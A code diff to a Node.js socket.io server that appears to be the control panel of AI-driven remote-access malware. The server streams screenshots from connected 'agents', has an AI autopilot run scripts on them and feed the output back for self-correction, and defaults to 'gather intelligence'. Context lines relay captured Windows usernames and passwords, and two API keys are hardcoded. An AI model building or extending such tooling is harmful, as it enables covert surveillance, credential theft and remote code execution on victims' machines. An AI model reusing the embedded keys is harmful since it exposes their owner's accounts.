@@ -85,7 +85,8 @@ let aiMemory = loadMemoryData();
 let agents = {};
 let activeAgentSocketId = null;
 let currentMode = savedData?.currentMode || 'B';
-let aiConfig = savedData?.aiConfig || { qwenKey: 'sk-c03ee9a5ceff42ac8a7d8f4476457475', deepseekKey: 'sk-ba786a1b6d94413d9dafe310ef44bcdf', autopilot: false, useVision: true, skill: 'default', customMission: '' };
+let aiConfig = savedData?.aiConfig || { qwenKey: 'sk-c03ee9a5ceff42ac8a7d8f4476457475', deepseekKey: 'sk-ba786a1b6d94413d9dafe310ef44bcdf', autopilot: false, useVision: true, liveStream: false, skill: 'default', customMission: '' };
+if (aiConfig.liveStream === undefined) aiConfig.liveStream = false;
 let lastScreenshot = null;
 let isAIBusy = false;
 let currentMissionId = 0;
@@ -234,6 +235,7 @@ io.on('connection', (socket) => {
       io.emit('agent_status', { online: true, mode: currentMode });
       io.emit('agent_list', { agents: serializeAgents(), active: activeAgentSocketId });
       socket.emit('set_mode', currentMode);
+      socket.emit('set_screenshot_rate', { rate: aiConfig.liveStream ? 0.25 : 3.0 });
       
     } else if (role === 'web') {
       console.log(`[WEB] Dashboard connected: ${socket.id}`);
@@ -262,6 +264,11 @@ io.on('connection', (socket) => {
           if (ag.networkMap) {
               socket.emit('network_update', { data: ag.networkMap });
           }
+          // Set screenshot rate for the active agent, and slow down others
+          for (let id in agents) {
+              const rate = (id === socketId) ? (aiConfig.liveStream ? 0.25 : 3.0) : 3.0;
+              io.to(id).emit('set_screenshot_rate', { rate });
+          }
       }
   });
 
@@ -284,6 +291,15 @@ io.on('connection', (socket) => {
   socket.on('toggle_vision', (enabled) => {
     aiConfig.useVision = enabled;
     io.emit('sync_ai_config', aiConfig);
+  });
+
+  // Live Stream Toggle
+  socket.on('toggle_live_stream', (enabled) => {
+    aiConfig.liveStream = enabled;
+    io.emit('sync_ai_config', aiConfig);
+    if (activeAgentSocketId) {
+      io.to(activeAgentSocketId).emit('set_screenshot_rate', { rate: enabled ? 0.25 : 3.0 });
+    }
   });
 
   // Scan Vision Request
@@ -523,6 +539,50 @@ io.on('connection', (socket) => {
     io.emit('error_msg', `🔑 WIN PASSWORD CAPTURED! User: ${data.user} | Password: ${data.password}`);
   });
 
+  // 12. COMMAND FEEDBACK — Maklum balas dari execute_script/write_file untuk Self-Debugging
+  socket.on('command_feedback', (data) => {
+    console.log(`[FEEDBACK] Received agent command execution output:`, data);
+    
+    let feedbackStr = '';
+    if (data.status === 'success') {
+      feedbackStr = `[SYSTEM] Action succeeded. Exit Code: ${data.exit_code || 0}\n`;
+      if (data.msg) feedbackStr += `Feedback: ${data.msg}\n`;
+      if (data.stdout && data.stdout.trim()) {
+        feedbackStr += `STDOUT:\n${data.stdout.substring(0, 1500)}\n`;
+      }
+      if (data.stderr && data.stderr.trim()) {
+        feedbackStr += `STDERR (ERROR):\n${data.stderr.substring(0, 1500)}\n`;
+      }
+    } else {
+      feedbackStr = `[SYSTEM] Action failed: ${data.msg}\n`;
+    }
+    
+    // Suntik maklum balas secara terus ke dalam perbualan AI untuk self-debugging
+    if (agents[socket.id]) {
+      if (!agents[socket.id].conversationHistory) {
+        agents[socket.id].conversationHistory = [];
+      }
+      agents[socket.id].conversationHistory.push({
+        role: 'user',
+        content: feedbackStr
+      });
+      // Hadkan sejarah perbualan agar tidak terlebih token
+      if (agents[socket.id].conversationHistory.length > 40) {
+        agents[socket.id].conversationHistory.splice(0, 2);
+      }
+    }
+    
+    io.emit('error_msg', `[FEEDBACK] Output captured. Ralat skrip akan dibetulkan sendiri oleh AI.`);
+    
+    // Autopilot: Auto-cetus langkah seterusnya dengan sejarah maklum balas baharu!
+    if (aiConfig.autopilot && !isAIBusy && lastScreenshot) {
+      setTimeout(() => {
+        io.emit('error_msg', `[AUTO] Self-Debugging Loop: Analyzing feedback and correction plans...`);
+        processAIScreenshot(lastScreenshot, activeMissionPrompt, activeMissionSteps);
+      }, 1000);
+    }
+  });
+
   // Handle Disconnection
   socket.on('disconnect', () => {
     console.log(`[DISCONNECT] ${socket.id} disconnected.`);
@@ -543,6 +603,55 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 
+// Lightweight Semantic Search / Term Frequency Matching for Long-Term Memory
+function retrieveRelevantMemories(query, memoriesList, limit = 5) {
+  if (!memoriesList || memoriesList.length === 0) return [];
+  
+  // 1. Helper: Tokenize and clean text (remove punctuation and filter short words)
+  function tokenize(text) {
+    if (typeof text !== 'string') return [];
+    return text.toLowerCase()
+      .replace(/[^a-z0-9\s]/g, '')
+      .split(/\s+/)
+      .filter(w => w.length > 2);
+  }
+  
+  const queryTokens = tokenize(query);
+  if (queryTokens.length === 0) return memoriesList.slice(0, limit);
+  
+  // 2. Score each memory based on term overlap (normalized term frequency overlap)
+  const scored = memoriesList.map(memory => {
+    const memoryTokens = tokenize(memory);
+    
+    let score = 0;
+    queryTokens.forEach(qToken => {
+      const count = memoryTokens.filter(dToken => dToken === qToken).length;
+      if (count > 0) {
+        score += count;
+      }
+    });
+    
+    // Cosine-Normalized style overlap to avoid bias towards longer memory sentences
+    if (score > 0) {
+      score = score / (Math.sqrt(queryTokens.length) * Math.sqrt(memoryTokens.length));
+    }
+    
+    return { memory, score };
+  });
+  
+  // 3. Sort descending by score
+  scored.sort((a, b) => b.score - a.score);
+  
+  // Extract non-zero matched documents
+  const matched = scored.filter(item => item.score > 0).map(item => item.memory);
+  if (matched.length > 0) {
+    return matched.slice(0, limit);
+  }
+  
+  // Fallback: If no matches are found, return first few general ones
+  return memoriesList.slice(0, limit);
+}
+
 // ============================================================
 // AI LOGIC — World-Class Prompt Injection
 // ============================================================
@@ -551,6 +660,12 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
   const myMissionId = currentMissionId;
   isAIBusy = true;
   let shouldKeepBusy = false;
+  
+  // Broadcast AI busy status and trigger dynamic high-FPS screenshots
+  io.emit('ai_busy_status', { busy: true });
+  if (activeAgentSocketId) {
+    io.to(activeAgentSocketId).emit('set_screenshot_rate', { rate: 0.25 });
+  }
   try {
     let result = null;
     let aiBrain;
@@ -618,7 +733,18 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       }
       return parts.length > 0 ? parts.join(' | ') : 'No long-term memories stored yet.';
     };
-    const formattedMemory = formatMemory(aiMemory);
+    // Use the lightweight semantic retriever to find relevant memories matching active mission query
+    const activeQuery = customPrompt || aiConfig.customMission || missionInstruction || 'Explore and gather intelligence';
+    const relevantFacts = retrieveRelevantMemories(activeQuery, aiMemory.facts || [], 5);
+    const relevantLessons = retrieveRelevantMemories(activeQuery, aiMemory.lessons || [], 3);
+    const relevantNotes = retrieveRelevantMemories(activeQuery, aiMemory.notes || [], 3);
+    
+    const relevantMemory = {
+      facts: relevantFacts,
+      lessons: relevantLessons,
+      notes: relevantNotes
+    };
+    const formattedMemory = formatMemory(relevantMemory);
 
     // Build prompt using ai_brain.js module or fallback
     let promptText;
@@ -689,10 +815,12 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
       const parsed = JSON.parse(cleanResult);
 
       // ══════ PHASE 1: HARD LOOP BLOCKER ══════
-      const actionSig = `${parsed.action}|${parsed.url || ''}|${parsed.command || ''}|${parsed.selector || ''}`;
+      const parsedKeys = Object.keys(parsed).filter(k => k !== 'thought' && k !== 'reason').sort();
+      const actionSig = parsedKeys.map(k => `${k}:${JSON.stringify(parsed[k])}`).join('|');
+      
       if (actionSig === lastActionSignature && parsed.action !== 'nothing' && parsed.action !== 'request_vision') {
         console.log(`[LOOP BLOCKED] Duplicate action detected: ${actionSig}`);
-        io.emit('error_msg', `[LOOP BLOCKED] AI tried to repeat: ${parsed.action}. Forcing mission complete.`);
+        io.emit('error_msg', `[LOOP BLOCKED] AI tried to repeat: ${parsed.action} with identical parameters. Forcing mission complete.`);
         parsed.action = 'nothing';
         parsed.reason = 'Duplicate action blocked by server';
       }
@@ -882,6 +1010,10 @@ async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemain
   } finally {
     if (!shouldKeepBusy) {
       isAIBusy = false;
+      io.emit('ai_busy_status', { busy: false });
+      if (activeAgentSocketId) {
+        io.to(activeAgentSocketId).emit('set_screenshot_rate', { rate: aiConfig.liveStream ? 0.25 : 3.0 });
+      }
     }
   }
 }
